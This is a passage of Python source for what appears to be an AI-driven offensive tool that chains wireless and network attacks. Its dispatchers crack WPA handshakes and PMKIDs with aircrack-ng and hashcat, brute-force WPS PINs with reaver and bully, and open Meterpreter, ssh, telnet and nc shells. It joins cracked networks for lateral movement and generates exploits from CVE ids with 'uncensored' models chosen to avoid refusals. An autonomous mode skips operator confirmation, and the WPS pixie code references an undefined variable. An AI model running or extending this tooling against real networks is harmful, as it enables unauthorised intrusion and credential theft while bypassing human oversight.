                report: Dict[str, Any], *, cves: List[Dict[str, Any]],
                kb_tools, attach_zd: Optional[bool]
                ) -> Optional[List[Dict[str, Any]]]:
        """One re-plan call to ``chain_planner.plan`` with the live
        ``prior_results``. Returns the new step list or ``None`` on
        failure. Never raises."""
        try:
            return self.chain_planner.plan(
                domain=domain, target=seed,
                cves=cves, kb_tools=kb_tools,
                prior_results=list(report["executed"]),
                attach_zero_day=attach_zd,
                attach_post_exploit=self._resolve_attach_post_exploit(None),
            )
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] re-plan failed: {e}")
            return None

    def _maybe_run_gain_access_hooks(self, domain: str, seed: Dict[str, Any],
                                     report: Dict[str, Any], *,
                                     autonomous: bool) -> None:
        """End-of-chain hooks (Part C), both operator-gated:

        1. Auto post-exploit: if access achieved AND a session_id is
           present, drive ``_dispatch_auto_post_exploit`` with the real
           session_id (the runner validates; we never fake one).
        2. Interactive target shell: if a session_id is present, spawn
           ``open_interactive_session`` (msfconsole ``sessions -i <id>``
           in an external window, no ``exit``).

        Both are skipped when access wasn't achieved. The AI ``open_shell``
        step (the second shell path, ssh/telnet/http/nc) is dispatched
        inline during the walk, not here. Never raises."""
        try:
            access = report.get("access") or {}
            if not access.get("achieved"):
                return
            session_id = access.get("session_id")
            creds = access.get("creds")
            if session_id and self.post_exploit_runner is not None:
                self._emit(
                    "[*] Access achieved with a session — running the "
                    "auto post-exploit chain (operator-gated)"
                )
                self._dispatch_auto_post_exploit(
                    {"args": {"session_id": session_id, "creds": creds}},
                    seed, report,
                )
            if session_id:
                self.open_interactive_session(session_id, report,
                                              autonomous=autonomous)
            # Phase 6: post-access external TUI auto-open (operator-gated,
            # one-shot). The TUI is a separate window that the operator
            # uses to control the device / network after access. We do
            # NOT re-confirm the spawn (the gate already fired in
            # :meth:`_maybe_run_gain_access_hooks` for the gaining
            # step); the spawner itself is operator-gated via the
            # ACCEPT prompt that lives inside ``spawn_post_access_tui``.
            self._maybe_spawn_post_access_tui(report, autonomous=autonomous)
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] gain-access hooks failed: {e}")

    # ------------------------------------------------------------------
    # Kismet prechain — pull the operator's own capture files
    # ------------------------------------------------------------------
    def _maybe_kismet_prechain(self,
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Best-effort, UNGATED pre-chain check.

        Reads ``workspace/captures/*.kismet`` (the operator's own
        files) and surfaces a structured context that the chain
        planner can ingest as ``target['recon']`` without needing
        a fresh airodump scan.

        Failure modes are honest-degrade: missing tool, missing
        dir, no match, kismet_cap_to_pcap missing — all log an
        ``[i] kismet prechain: <reason>; skipping`` line and
        return without modifying the chain. The prechain NEVER
        contacts the target.
        """
        try:
            from core.scanners.kismet_runner import KismetRunner
        except Exception as e:  # noqa: BLE001
            self._emit(f"[i] kismet prechain: import failed; skipping ({e})")
            return
        target = seed.get("target") if isinstance(seed, dict) else None
        if not isinstance(target, dict):
            self._emit("[i] kismet prechain: no target in seed; skipping")
            return
        captures_dir = (
            seed.get("captures_dir")
            or "workspace/captures"
        )
        runner = KismetRunner()
        if not runner.is_installed():
            self._emit("[i] kismet prechain: kismet not installed; skipping")
            return
        try:
            res = runner.apply_to_prechain(
                target=target, captures_dir=captures_dir,
            )
        except Exception as e:  # noqa: BLE001
            self._emit(
                f"[i] kismet prechain: runner raised ({e}); skipping"
            )
            return
        if not res.get("ok"):
            self._emit(
                f"[i] kismet prechain: {res.get('error', 'no match')}; skipping"
            )
            return
        n = res.get("n_captures", 0)
        if n <= 0:
            self._emit("[i] kismet prechain: no matching capture; skipping")
            return
        # Merge into seed.target.recon so the planner can ingest it.
        target_recon = target.setdefault("recon", {})
        if not isinstance(target_recon, dict):
            target_recon = {}
            target["recon"] = target_recon
        target_recon["kismet_prechain"] = res
        report.setdefault("kismet_prechain", res)
        self._emit(
            f"[*] kismet prechain: ingested {n} capture(s) for "
            f"{target.get('ssid') or target.get('bssid') or '<target>'}"
        )

    def _maybe_spawn_post_access_tui(self, report: Dict[str, Any],
                                     *, autonomous: bool) -> None:
        """Auto-open the post-access external TUI when access is achieved.

        The spawn is ONE-SHOT per chain (tracked via
        ``report["access"]["tui_opened"]``) so re-plan loops don't
        re-fire it. Operator-gated: in non-autonomous mode the
        spawner raises its own ACCEPT/CANCEL prompt before launching
        a window. Never raises.
        """
        try:
            from core.post_access_tui.spawner import (
                is_post_access_spawnable, spawn_post_access_tui,
            )
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] post_access_tui import failed: {e}")
            return
        if not is_post_access_spawnable(report):
            return
        if not isinstance(report.get("access"), dict):
            return
        if report["access"].get("tui_opened"):
            # Already opened this chain — don't re-fire.
            return
        if not autonomous:
            accept = self.confirm_fn(
                "AI STEP: open external POST-ACCESS TUI for the captured "
                "session? (F12/Esc to detach; main chain keeps running)"
            )
            if not accept:
                self._emit("[-] CANCELLED: open external post-access TUI")
                return
        res = spawn_post_access_tui(report, self.external_terminal)
        if res.get("ok"):
            self._emit(
                f"[+] post-access TUI spawned (pid={res.get('pid')})"
            )
            # Push the post-access status to the dashboard so the
            # status pill lights up. Best-effort; no-op when the
            # dashboard is not wired.
            self._push_dashboard_post_access(report.get("access", {}))
        else:
            # Honest: no real terminal backend or other refusal
            err = res.get("error", "unknown")
            manual = res.get("manual", "")
            self._emit(f"[i] post-access TUI: {err}")
            if manual:
                self._emit(f"[i] manual: {manual}")

    def open_interactive_session(self, session_id, report: Dict[str, Any],
                                 *, autonomous: bool) -> Dict[str, Any]:
        """Spawn an interactive Meterpreter/shell session in an external
        terminal via ``msfconsole -x "sessions -i <id>"`` — crucially
        with NO trailing ``exit``, so the operator lands on a live
        prompt. Operator-gated (ACCEPT/CANCEL). When no real terminal
        backend is wired, logs the exact manual command instead.

        Returns a result dict and never raises. Records the step in
        ``report["executed"]``."""
        desc = f"open_interactive_session: sessions -i {session_id}"
        self._emit(f"[*] AI STEP (open_shell): {desc}")
        if not autonomous:
            accept = self.confirm_fn(
                f"ACCEPT INTRUSIVE step? {desc}\n"
                "  expected: live meterpreter/shell prompt on the target"
            )
            if not accept:
                self._emit(f"[-] CANCELLED: {desc}")
                report["skipped"].append(desc)
                return {"ok": False, "cancelled": True}
        cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id}"]
        step = {"action": "open_shell", "tool": "msfconsole",
                "session_id": session_id}
        res = self._launch_real_step_window(step, cmd)
        if not res.get("ok"):
            # No real terminal backend — give the operator the exact
            # command to run by hand rather than silently no-op'ing.
            manual = " ".join(cmd)
            self._emit(
                f"[i] no external terminal wired; run manually: {manual}"
            )
            res = {"ok": True, "manual": manual,
                   "note": "no terminal backend; command printed"}
        else:
            self._emit(f"[+] interactive session launched: pid={res.get('pid')}")
        entry = {
            "desc": desc, "kind": "ai", "action": "open_shell",
            "tool": "msfconsole", "session_id": session_id, "result": res,
        }
        report["executed"].append(entry)
        self._record_access(report, entry)
        return res

    def _dispatch_open_post_access_tui(self, step: Dict[str, Any],
                                       seed: Dict[str, Any],
                                       report: Dict[str, Any]) -> None:
        """AI-driven open of the post-access external TUI (action
        ``open_post_access_tui``). The per-step ACCEPT/CANCEL already
        fired in :meth:`_walk_ai_step`; this dispatcher does NOT
        re-confirm (single-gate invariant). The spawner itself is
        operator-gated inside ``spawn_post_access_tui`` for the
        non-AI-driven case; here the AI is the trigger so we skip
        the spawner's own gate.

        The spawn is one-shot: subsequent calls no-op (the
        ``tui_opened`` sentinel prevents re-fires on re-plan loops).
        Never raises.
        """
        try:
            from core.post_access_tui.spawner import spawn_post_access_tui
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] post_access_tui import failed: {e}")
            report["skipped"].append(f"open_post_access_tui: import: {e}")
            return
        # The AI can pass an explicit target; otherwise use the seed.
        args = step.get("args", {}) or {}
        if isinstance(args, dict) and args.get("target"):
            report.setdefault("target", args["target"])
        res = spawn_post_access_tui(report, self.external_terminal)
        ok = bool(res and res.get("ok"))
        if ok:
            self._emit(
                f"[+] open_post_access_tui: spawned pid={res.get('pid')}"
            )
            self._push_dashboard_post_access(report.get("access", {}))
        else:
            err = res.get("error", "unknown") if isinstance(res, dict) else "unknown"
            self._emit(f"[i] open_post_access_tui: {err}")
        entry = {
            "desc": "open_post_access_tui",
            "kind": "ai", "action": "open_post_access_tui",
            "tool": "core.post_access_tui",
            "result": res if isinstance(res, dict) else {"ok": False, "error": "spawner returned non-dict"},
        }
        report["executed"].append(entry)
        self._record_access(report, entry)


    def _dispatch_open_ble_tui(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """AI ``open_ble_tui`` step dispatcher.

        Opens the BLE RAT-like panel inside the post-access TUI
        (``tui_mode="ble"``) in a separate terminal window. The
        per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step`; this dispatcher does NOT re-confirm
        (single-gate invariant).

        The spawner is the same one used for ``open_post_access_tui``:
        it routes through :func:`core.utils.external_terminal.launch_real_step`
        so the new TUI opens in the operator's terminal of choice. The
        spawn is one-shot per chain (the ``tui_opened`` sentinel on
        the BLE / Network sub-mode key prevents re-fires on re-plan
        loops). Never raises.
        """
        try:
            from core.post_access_tui.spawner import spawn_post_access_tui
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] post_access_tui import failed: {e}")
            report["skipped"].append(f"open_ble_tui: import: {e}")
            return
        # The AI can pass an explicit device path; otherwise leave None
        # (the TUI's [C]onnect prompt will pre-fill from --ble-device
        # if set).
        args = step.get("args", {}) or {}
        if not isinstance(args, dict):
            args = {}
        device_path = args.get("device_path") or args.get("ble_device")
        # One-shot per chain.
        sentinel_key = "ble_tui_opened"
        report.setdefault("access", {})
        if isinstance(report["access"], dict) and report["access"].get(sentinel_key):
            self._emit("[i] open_ble_tui: already opened this chain; skipping")
            report["skipped"].append("open_ble_tui: already opened")
            return
        # The post-access TUI requires a session_id OR creds in the
        # report. If neither is set, we synthesize a stub session from
        # the BLE target fingerprint so the panel can still open
        # (operator can re-bind via the panel prompt). Never fabricates
        # cracked PSKs / cleartext creds — the session_id is a
        # local-only marker, not a transport credential.
        access = report["access"]
        if not (access.get("session_id") or access.get("creds")):
            target = (
                report.get("target")
                or seed.get("bssid")
                or seed.get("address")
                or seed.get("name")
                or "ble-target"
            )
            access["session_id"] = f"ble-spawn-{hash(str(target)) & 0xffffff:06x}"
            access["achieved"] = True
            access["transport"] = "ble"
        res = spawn_post_access_tui(
            report, self.external_terminal,
            tui_mode="ble",
            ble_device_path=device_path,
        )
        ok = bool(res and res.get("ok"))
        if ok:
            self._emit(
                f"[+] open_ble_tui: spawned pid={res.get('pid')}"
            )
            self._push_dashboard_post_access(report.get("access", {}))
        else:
            err = res.get("error", "unknown") if isinstance(res, dict) else "unknown"
            self._emit(f"[i] open_ble_tui: {err}")
        # Mark one-shot (even on failure to avoid repeat spawns).
        if isinstance(report.get("access"), dict):
            report["access"][sentinel_key] = True
        entry = {
            "desc": "open_ble_tui",
            "kind": "ai", "action": "open_ble_tui",
            "tool": "core.post_access_tui",
            "result": res if isinstance(res, dict) else {"ok": False, "error": "spawner returned non-dict"},
        }
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_open_network_tui(self, step: Dict[str, Any],
                                   seed: Dict[str, Any],
                                   report: Dict[str, Any]) -> None:
        """AI ``open_network_tui`` step dispatcher.

        Opens the network session-multiplexer panel inside the
        post-access TUI (``tui_mode="network"``) in a separate
        terminal window. The per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step`; this dispatcher does NOT re-confirm
        (single-gate invariant).

        Same one-shot + spawner contract as
        :meth:`_dispatch_open_ble_tui`. Never raises.
        """
        try:
            from core.post_access_tui.spawner import spawn_post_access_tui
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] post_access_tui import failed: {e}")
            report["skipped"].append(f"open_network_tui: import: {e}")
            return
        args = step.get("args", {}) or {}
        if not isinstance(args, dict):
            args = {}
        session_filter = args.get("net_session_filter") or args.get("net_filter")
        sentinel_key = "network_tui_opened"
        report.setdefault("access", {})
        if isinstance(report["access"], dict) and report["access"].get(sentinel_key):
            self._emit("[i] open_network_tui: already opened this chain; skipping")
            report["skipped"].append("open_network_tui: already opened")
            return
        access = report["access"]
        if not (access.get("session_id") or access.get("creds")):
            target = (
                report.get("target")
                or seed.get("bssid")
                or seed.get("address")
                or seed.get("name")
                or "network-target"
            )
            access["session_id"] = f"net-spawn-{hash(str(target)) & 0xffffff:06x}"
            access["achieved"] = True
            access["transport"] = "net"
        res = spawn_post_access_tui(
            report, self.external_terminal,
            tui_mode="network",
            net_session_filter=session_filter,
        )
        ok = bool(res and res.get("ok"))
        if ok:
            self._emit(
                f"[+] open_network_tui: spawned pid={res.get('pid')}"
            )
            self._push_dashboard_post_access(report.get("access", {}))
        else:
            err = res.get("error", "unknown") if isinstance(res, dict) else "unknown"
            self._emit(f"[i] open_network_tui: {err}")
        if isinstance(report.get("access"), dict):
            report["access"][sentinel_key] = True
        entry = {
            "desc": "open_network_tui",
            "kind": "ai", "action": "open_network_tui",
            "tool": "core.post_access_tui",
            "result": res if isinstance(res, dict) else {"ok": False, "error": "spawner returned non-dict"},
        }
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_cve_to_exploit(self, step: Dict[str, Any], seed: Dict[str, Any],
                                 report: Dict[str, Any]) -> None:
        """AI ``cve_to_exploit`` step dispatcher.

        The per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step`; this dispatcher does NOT re-confirm
        (single-gate invariant). The pipeline is honest: any failure
        (no NVD key, no CVE match, no model, model refused) returns
        ``ok=False`` with ``error``; the step is recorded honestly
        with the result envelope.

        Args schema (step["args"]):
            cve_id:    str (required) — the CVE id (e.g. "CVE-2024-1234")

        Side effects:
            - appends the result to ``report["executed"]``
            - merges the result into ``seed["exploits"]`` and
              ``report["exploits"]`` so subsequent steps (and the
              chain planner) can see it
            - pushes a status payload to the dashboard pill via
              :meth:`_push_dashboard_exploit_status`
        """
        try:
            from core.cve_to_exploit import cve_to_exploit_pipeline
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] cve_to_exploit import failed: {e}")
            report["skipped"].append(f"cve_to_exploit: import: {e}")
            return
        args = step.get("args", {}) or {}
        cve_id = (args.get("cve_id") or "").strip()
        if not cve_id:
            self._emit("[!] cve_to_exploit: missing cve_id in args")
            report["skipped"].append("cve_to_exploit: no cve_id")
            return
        try:
            result = cve_to_exploit_pipeline(
                cve_id,
                ai_backend=self.ai_backend,
                exploit_gen_manager=self.exploit_gen_manager,
                on_event=self._emit,
            )
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] cve_to_exploit raised: {e!r}")
            result = {
                "cve_id": cve_id, "ok": False, "error": f"raised: {e}",
            }
        # Normalize to dict.
        if hasattr(result, "to_dict"):
            res_dict = result.to_dict()
        elif isinstance(result, dict):
            res_dict = result
        else:
            res_dict = {"cve_id": cve_id, "ok": False, "error": "non-dict result"}
        ok = bool(res_dict.get("ok"))
        if ok:
            self._emit(
                f"[+] cve_to_exploit: ok cve={cve_id} "
                f"model={res_dict.get('model_used', '?')} "
                f"bytes={len(res_dict.get('exploit_code', '') or '')}"
            )
        else:
            self._emit(
                f"[i] cve_to_exploit: cve={cve_id} failed: "
                f"{res_dict.get('error', 'unknown')}"
            )
        entry = {
            "desc": f"cve_to_exploit {cve_id}",
            "kind": "ai", "action": "cve_to_exploit",
            "tool": "core.cve_to_exploit",
            "result": res_dict,
        }
        report["executed"].append(entry)
        # Seed + report exploit index (operator-readable).
        seed.setdefault("exploits", []).append(res_dict)
        report.setdefault("exploits", []).append(res_dict)
        # Dashboard pill.
        self._push_dashboard_exploit_status({
            "last_cve_id": cve_id,
            "last_model": res_dict.get("model_used", "") or "",
            "ok": ok,
            "last_ts": res_dict.get("ts", 0.0),
        })


    def _dispatch_cve_to_exploit_batch(self, step: Dict[str, Any],
                                        seed: Dict[str, Any],
                                        report: Dict[str, Any]) -> None:
        """Multi-CVE exploit generation. Wraps
        :func:`core.cve_to_exploit.cve_to_exploit_batch` which calls
        :func:`cve_to_exploit_pipeline` once per CVE id.

        Args shape::

            {"cve_ids": ["CVE-2017-13077", "CVE-2017-13082", ...],
             "tier": "default" | "heavy" | "fallback"}

        The NVD API key is loaded via
        :func:`core.ai_backend.get_nvd_key` (NEVER inline). Each
        per-CVE call uses the operator's preferred uncensored
        code-architect model (Tier 1 default; the ExploitGenModelManager
        falls back to HERETIC 9B then the cyber-tuned GGUF tier).

        Never fabricates CVEs — only operator-supplied ids are looked
        up. The honest-degrade envelope ``{ok: False, error: ...}`` is
        returned for unknown ids, NOT a fabricated exploit.

        The per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` (single, default-deny; we do NOT
        re-confirm). Never raises.
        """
        from core.cve_to_exploit import cve_to_exploit_batch

        args = step.get("args", {}) or {}
        cve_ids = args.get("cve_ids") or args.get("cves") or []
        if not isinstance(cve_ids, list):
            self._emit(
                f"[-] cve_to_exploit_batch: 'cve_ids' must be a list, got "
                f"{type(cve_ids).__name__}")
            report["skipped"].append(
                "cve_to_exploit_batch: cve_ids not a list")
            return
        try:
            res = cve_to_exploit_batch(
                cve_ids=cve_ids,
                on_event=self._emit,
            )
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] cve_to_exploit_batch failed: {e}")
            report["skipped"].append(f"cve_to_exploit_batch: {e}")
            return
        ok = bool(res.get("ok"))
        summary = (res.get("data") or {}).get("summary", {})
        n_ok = summary.get("ok_count", 0)
        n_fail = summary.get("fail_count", 0)
        self._emit(
            f"[+] cve_to_exploit_batch: {n_ok} ok / {n_fail} fail "
            f"out of {len(cve_ids)} CVEs; "
            f"nvd_key_loaded={res.get('nvd_key_loaded', False)}; "
            f"error={res.get('error') or 'none'}")
        entry = {
            "desc": f"cve_to_exploit_batch ({len(cve_ids)} cves)",
            "kind": "ai", "action": "cve_to_exploit_batch",
            "tool": "core.cve_to_exploit.batch",
            "ok": ok, "result": res,
        }
        report["executed"].append(entry)
        # Surface the per-CVE results on seed["exploits"] so the
        # re-planner sees them.
        for sub in (res.get("results") or []):
            if sub.get("ok") and sub.get("data"):
                seed.setdefault("exploits", []).append(sub["data"])
        # Dashboard pill
        self._push_dashboard_exploit_status({
            "last_cve_id": (cve_ids[0] if cve_ids else ""),
            "last_model": "batch",
            "ok": ok,
            "last_ts": res.get("duration_s", 0.0),
        })


    def _dispatch_open_shell(self, step: Dict[str, Any], seed: Dict[str, Any],
                             report: Dict[str, Any]) -> None:
        """AI ``open_shell`` step dispatcher (the non-msf shell path).

        ``args`` = {protocol: "ssh"|"telnet"|"http"|"nc", host, user?,
        cred?, port?}. Builds the client argv and spawns it in an
        external window via :meth:`_launch_real_step_window`. When no
        real terminal is wired, logs the manual command. Gated upstream
        by the per-step ACCEPT in :meth:`_walk_ai_step`. Never raises."""
        args = step.get("args", {}) or {}
        protocol = (args.get("protocol") or "ssh").lower()
        host = args.get("host") or seed.get("host") or seed.get("target")
        user = args.get("user") or seed.get("user")
        cred = args.get("cred") or args.get("password") or seed.get("cred")
        port = args.get("port")
        if not host:
            self._emit("[!] open_shell: no host in args/seed; skipping")
            report["skipped"].append("open_shell: no host")
            return
        cmd: List[str]
        if protocol == "ssh":
            cmd = ["ssh"]
            if user:
                cmd += ["-l", str(user)]
            if port:
                cmd += ["-p", str(port)]
            cmd.append(str(host))
        elif protocol == "telnet":
            cmd = ["telnet", str(host)]
            if port:
                cmd.append(str(port))
        elif protocol == "nc":
            cmd = ["nc", str(host)]
            cmd.append(str(port) if port else "4444")
        elif protocol == "http":
            # curl with auth — a pragmatic "http shell" for web footholds.
            url = str(host) if str(host).startswith("http") else f"http://{host}"
            cmd = ["curl", "-i"]
            if user and cred:
                cmd += ["-u", f"{user}:{cred}"]
            cmd.append(url)
        else:
            self._emit(f"[!] open_shell: unknown protocol {protocol!r}; skipping")
            report["skipped"].append(f"open_shell: unknown protocol {protocol}")
            return
        desc = f"open_shell {protocol} {user or ''}@{host}".replace(" @", "@")
        step_for_window = {"action": "open_shell", "tool": protocol,
                           "host": host}
        res = self._launch_real_step_window(step_for_window, cmd)
        if not res.get("ok"):
            manual = " ".join(cmd)
            self._emit(
                f"[i] no external terminal wired; run manually: {manual}"
            )
            res = {"ok": True, "manual": manual,
                   "note": "no terminal backend; command printed"}
        else:
            self._emit(f"[+] open_shell launched: pid={res.get('pid')}")
        entry = {
            "desc": desc, "kind": "ai", "action": "open_shell",
            "tool": protocol, "result": res,
            "data": {"creds": cred, "host": host, "protocol": protocol},
        }
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_crack(self, step: Dict[str, Any], seed: Dict[str, Any],
                        report: Dict[str, Any]) -> None:
        """AI ``crack`` step: real aircrack-ng dictionary attack on the
        captured handshake, with a resolved wordlist (weakpass → rockyou).
        Propagates a recovered PSK via ``data={"creds": ...}`` so
        :meth:`_record_access` flips ``report["access"]``. Never raises."""
        args = step.get("args", {}) or {}
        pcap = (args.get("cap_file") or args.get("pcap")
                or seed.get("cap_file") or seed.get("pcap"))
        bssid = args.get("bssid") or seed.get("bssid")
        wep = bool(args.get("wep") or seed.get("wep"))
        wordlist = self._resolve_wordlist(
            seed, report, prefer=args.get("wordlist"))
        desc = (f"crack aircrack-ng "
                f"{'WEP' if wep else 'WPA'} {os.path.basename(pcap) if pcap else '?'}")
        if not pcap:
            self._emit("[!] crack: no cap_file in args/seed; skipping")
            report["skipped"].append("crack: no cap_file")
            return
        res = self._crack_with_aircrack(pcap, wordlist, bssid=bssid, wep=wep)
        self._emit(
            f"[+] crack: ok={res.get('ok')} creds={'yes' if res.get('creds') else 'no'}"
            + (f" ({res.get('error')})" if res.get("error") else "")
        )
        data = {"creds": res.get("creds")} if res.get("creds") else {}
        entry = {"desc": desc, "kind": "ai", "action": "crack",
                 "tool": "aircrack-ng", "result": res, "data": data}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_pmkid(self, step: Dict[str, Any], seed: Dict[str, Any],
                        report: Dict[str, Any]) -> None:
        """AI ``pmkid`` step: clientless PMKID capture+crack via hashcat
        ``-m 22000``. Propagates the recovered PSK. Never raises."""
        args = step.get("args", {}) or {}
        pcap = (args.get("cap_file") or args.get("pcap")
                or seed.get("cap_file"))
        hash_file = args.get("hash_file")
        bssid = args.get("bssid") or seed.get("bssid")
        wordlist = self._resolve_wordlist(
            seed, report, prefer=args.get("wordlist"))
        if not hash_file and pcap:
            hash_file = self._pcap_to_hc22000(pcap)
        desc = f"pmkid hashcat -m 22000 {os.path.basename(hash_file) if hash_file else '?'}"
        if not hash_file:
            self._emit("[!] pmkid: no hash_file/cap_file; skipping")
            report["skipped"].append("pmkid: no hash file")
            return
        res = self._crack_with_hashcat(
            hash_file, wordlist=wordlist, mode="22000", attack_mode=0,
            gpu=not args.get("cpu_only", False))
        self._emit(
            f"[+] pmkid: ok={res.get('ok')} creds={'yes' if res.get('creds') else 'no'}"
        )
        data = {"creds": res.get("creds")} if res.get("creds") else {}
        entry = {"desc": desc, "kind": "ai", "action": "pmkid",
                 "tool": "hashcat", "result": res, "data": data}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_crack_gpu(self, step: Dict[str, Any], seed: Dict[str, Any],
                            report: Dict[str, Any]) -> None:
        """AI ``crack_gpu`` step: hashcat GPU mask bruteforce
        (``-m 22000 -a 3 <mask> -D 2``). Converts a pcap to hc22000 when
        only a capture is available. Propagates the recovered PSK. Never
        raises."""
        args = step.get("args", {}) or {}
        pcap = (args.get("cap_file") or args.get("pcap")
                or seed.get("cap_file"))
        hash_file = args.get("hash_file")
        mask = args.get("mask") or "?d?d?d?d?d?d?d?d"
        if not hash_file and pcap:
            hash_file = self._pcap_to_hc22000(pcap)
        desc = f"crack_gpu hashcat -a 3 {os.path.basename(hash_file) if hash_file else '?'}"
        if not hash_file:
            self._emit("[!] crack_gpu: no hash_file/cap_file; skipping")
            report["skipped"].append("crack_gpu: no hash file")
            return
        res = self._crack_with_hashcat(
            hash_file, mask=mask, mode="22000", attack_mode=3, gpu=True)
        self._emit(
            f"[+] crack_gpu: ok={res.get('ok')} creds={'yes' if res.get('creds') else 'no'}"
        )
        data = {"creds": res.get("creds")} if res.get("creds") else {}
        entry = {"desc": desc, "kind": "ai", "action": "crack_gpu",
                 "tool": "hashcat", "result": res, "data": data}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_wps_pixie(self, step: Dict[str, Any], seed: Dict[str, Any],
                            report: Dict[str, Any]) -> None:
        """AI ``wps_pixie`` step: reaver/bully pixie-dust attack. Parses
        the recovered WPS PIN/PSK and propagates it. Never raises."""
        import subprocess
        args = step.get("args", {}) or {}
        iface = (args.get("interface") or args.get("iface")
                 or seed.get("iface") or self.interface)
        bssid = args.get("bssid") or seed.get("bssid")
        if not bssid:
            self._emit("[!] wps_pixie: no bssid; skipping")
            report["skipped"].append("wps_pixie: no bssid")
            return
        cmd = ["reaver", "-i", str(iface), "-b", str(bssid),
               "-K", "1", "-vv"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=600)
        except FileNotFoundError:
            self._emit("[!] reaver not installed; trying bully")
            r = self._run_bully(iface, bssid, pixie=True)
        except Exception as e:  # noqa: BLE001
            res = {"ok": False, "method": "wps_pixie", "error": str(e)}
            report["executed"].append(
                {"desc": "wps_pixie", "kind": "ai", "action": "wps_pixie",
                 "tool": "reaver", "result": res, "data": {}})
            return
        # r may be a dict from _run_bully or a completed subprocess
        if isinstance(r, dict):
            out = f"{r.get('stdout') or ''}\n{r.get('stderr') or ''}"
            rc = r.get("return_code")
        else:
            rc = r.returncode
        pin, psk = self._parse_wps(out)
        creds = psk or pin
        self._emit(
            f"[+] wps_pixie: pin={'yes' if pin else 'no'} psk={'yes' if psk else 'no'}"
        )
        data = {"creds": creds, "pin": pin, "psk": psk} if creds else {}
        entry = {"desc": f"wps_pixie {bssid}", "kind": "ai",
                 "action": "wps_pixie", "tool": "reaver",
                 "result": {"ok": bool(creds), "method": "wps_pixie",
                            "return_code": rc, "creds": creds, "pin": pin,
                            "stdout_tail": out[-200:]},
                 "data": data}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _dispatch_wps_online(self, step: Dict[str, Any], seed: Dict[str, Any],
                             report: Dict[str, Any]) -> None:
        """AI ``wps_online`` step: reaver/bully online PIN bruteforce.
        Parses recovered PIN/PSK and propagates. Never raises."""
        import subprocess
        args = step.get("args", {}) or {}
        iface = (args.get("interface") or args.get("iface")
                 or seed.get("iface") or self.interface)
        bssid = args.get("bssid") or seed.get("bssid")
        if not bssid:
            self._emit("[!] wps_online: no bssid; skipping")
            report["skipped"].append("wps_online: no bssid")
            return
        cmd = ["reaver", "-i", str(iface), "-b", str(bssid), "-vv"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=1800)
        except FileNotFoundError:
            r = self._run_bully(iface, bssid, pixie=False)
        except Exception as e:  # noqa: BLE001
            report["executed"].append(
                {"desc": "wps_online", "kind": "ai", "action": "wps_online",
                 "tool": "reaver",
                 "result": {"ok": False, "method": "wps_online",
                            "error": str(e)}, "data": {}})
            return
        if isinstance(r, dict):
            out = f"{r.get('stdout') or ''}\n{r.get('stderr') or ''}"
            rc = r.get("return_code")
        else:
            out = f"{r.stdout or ''}\n{r.stderr or ''}"
            rc = r.returncode
        pin, psk = self._parse_wps(out)
        creds = psk or pin
        self._emit(
            f"[+] wps_online: pin={'yes' if pin else 'no'} psk={'yes' if psk else 'no'}"
        )
        data = {"creds": creds, "pin": pin, "psk": psk} if creds else {}
        entry = {"desc": f"wps_online {bssid}", "kind": "ai",
                 "action": "wps_online", "tool": "reaver",
                 "result": {"ok": bool(creds), "method": "wps_online",
                            "return_code": rc, "creds": creds, "pin": pin,
                            "stdout_tail": out[-200:]},
                 "data": data}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _run_bully(self, iface: str, bssid: str, pixie: bool = True) -> Dict[str, Any]:
        """Fallback to bully when reaver is absent. Returns a dict shaped
        like a completed subprocess result."""
        import subprocess
        cmd = ["bully", "-i", str(iface), "-b", str(bssid), "-v", "3"]
        if pixie:
            cmd += ["-d"]  # pixie-dust
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=600)
            return {"return_code": r.returncode,
                    "stdout": r.stdout or "", "stderr": r.stderr or ""}
        except FileNotFoundError:
            return {"return_code": 127, "stdout": "",
                    "stderr": "bully not installed"}
        except Exception as e:  # noqa: BLE001
            return {"return_code": 1, "stdout": "", "stderr": str(e)}

    def _parse_wps(self, out: str) -> tuple:
        """Parse a WPS PIN and PSK from reaver/bully output."""
        pin = None
        psk = None
        m = re.search(r"WPS PIN:\s*([0-9\-]{8,9})", out)
        if m:
            pin = m.group(1).strip()
        m = re.search(r"WPA PSK:\s*['\"]?(.+?)['\"]?\s*$", out, re.M)
        if m:
            psk = m.group(1).strip()
        return pin, psk

    # ------------------------------------------------------------------
    # Post-access lateral movement: join the network, discover its hosts,
    # stage per-device payloads. All gated; all never-raise.
    # ------------------------------------------------------------------

    def _access_creds(self, report: Dict[str, Any]) -> Optional[str]:
        try:
            return report.get("access", {}).get("creds") or None
        except Exception:  # noqa: BLE001
            return None

    def _dispatch_join_network(self, step: Dict[str, Any], seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """AI ``join_network`` step: associate to the cracked AP using the
        recovered PSK via ``wpa_supplicant`` (config in /tmp), then DHCP.
        Propagates the assigned lhost + subnet into ``report["access"]``."""
        import subprocess
        import tempfile
        args = step.get("args", {}) or {}
        ssid = args.get("ssid") or seed.get("ssid") or seed.get("essid")
